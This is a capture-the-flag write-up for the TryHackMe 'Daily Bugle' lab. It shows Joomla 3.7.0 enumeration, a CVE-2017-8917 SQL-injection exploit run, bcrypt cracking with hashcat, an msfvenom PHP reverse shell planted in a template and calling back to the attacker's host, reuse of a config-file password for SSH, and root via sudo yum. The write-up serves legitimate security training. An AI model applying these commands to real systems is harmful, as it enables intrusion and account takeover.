---
title: TryHackMe Daily Bugle
date: 2025-01-03
categories: CTFs
tags: tryhackme
---


![](/assets/img/daily_bugle/daily_bugle.png){: width=1000 height=200 }


# Information Gathering
We are instructed as follows:

> Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.

And we are given the target IP address `10.10.89.186`.

Our objectives are to

1. determine who robbed the bank,
2. identify the version of Joomla running on the web server,
3. obtain the user flag, and
4. obtain the root flag.


# Enumeration
We begin with an `nmap` scan `nmap -sS -T5 -sC -sV 10.10.89.186`, revealing

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
```

Upon navigating to the web server on port `80/TCP`, the front-page article discloses that it was "Spider-Man" who
robbed the bank. 

Fuzzing for directories with 
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
-u http://10.10.121.232/FUZZ -ic
``` 
yields

```
images                  [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 118ms]
                        [Status: 200, Size: 9259, Words: 441, Lines: 243, Duration: 223ms]
media                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 102ms]
templates               [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 102ms]
modules                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 98ms]
bin                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 99ms]
plugins                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 97ms]
includes                [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 99ms]
language                [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 98ms]
components              [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 100ms]
cache                   [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 100ms]
libraries               [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 98ms]
tmp                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 99ms]
layouts                 [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 102ms]
administrator           [Status: 301, Size: 243, Words: 14, Lines: 8, Duration: 95ms]
cli                     [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 104ms]
                        [Status: 200, Size: 9259, Words: 441, Lines: 243, Duration: 218ms]
```


To determine the Joomla version, we happen upon the web page [https://docs.joomla.org/How_to_check_the_Joomla_version%3F](https://docs.joomla.org/How_to_check_the_Joomla_version%3F), which suggests that we visit the URL 
`http://10.10.89.186/languages/en-GB/en-GB.xml`. However, this endpoint does not exist; instead, we visit
`http://10.10.89.186/language/en-GB/en-GB.xml`, upon which we find 

```
<metafile version="3.7" client="site">
<name>English (en-GB)</name>
<version>3.7.0</version>
...
```

Hence, we conclude that the web server is running Joomla version `3.7.0`.

# Exploitation
We find CVE-2017-8917 after some research. We also find a python implementation at [https://github.com/XiphosResearch/exploits/tree/master/Joomblah](https://github.com/XiphosResearch/exploits/tree/master/Joomblah).
Next, we clone the repository with  
`git clone https://github.com/XiphosResearch/exploits/tree/master`. Running
the exploit with `python3 joomblah.py http://10.10.89.186/` outputs

```
[$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com',
'$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
```

To crack the hash, we create a file `hash.txt` and copy into it the hash `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`. We then go to the web page `https://hashes.com/en/tools/hash_identifier` and use the provided
tool to discover that the hash type is  
`bcrypt $2*$, Blowfish (Unix)`. By running `hashcat --help`, we find that
the hash mode for this hash is `3200`. Then, we pass the file, along with the `rockyou.txt` wordlist, to hashcat
to perform a dictionary attack with the command

```bash
hashcat -D 2 -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
``` 

This quickly reveals Jonah's cracked password.

With this password, we sign in to the Joomla administrative panel at `http://10.10.89.186/administrator` as
the user `jonah`, and we generate a php web shell using  
`msfvenom -p php/reverse_php -o shell.php LHOST=10.6.4.176`.

To upload the file, we navigate to the `Templates` tab and modify the Protostar
template by copying into `index.php` the contents from our shell, `shell.php`. 

![](/assets/img/daily_bugle/templates.png)

Afterward, we 
set up a netcat listener with `ncat -lvnp 4444` and navigate to `http://10.10.89.186/index.php`.
This gives us a shell as `apache`.

# Post-Exploitation
By executing `ls -al /home`, we notice that the only user with a home directory is `jjameson`, and that, unfortunately,
we do not have read access to `/home/jjameson`. Nevertheless, we find a file named `configuration.php` in the web root directory `/var/www/html`, which contains the line  
`public $password = 'DOITURSELF:)';`. This password allows us to sign in as `jjameson` with `ssh jjameson@10.10.89.186`. We are then able to capture the user flag:

![](/assets/img/daily_bugle/user.txt.png)



Running `sudo -l`, we notice that we have sudo permissions for `yum` and use the the method demonstrated in part (b) 
of the article at [https://gtfobins.github.io/gtfobins/yum/](https://gtfobins.github.io/gtfobins/yum/) to obtain a root shell. With this shell, we capture the root flag:

![](/assets/img/daily_bugle/root.txt.png)
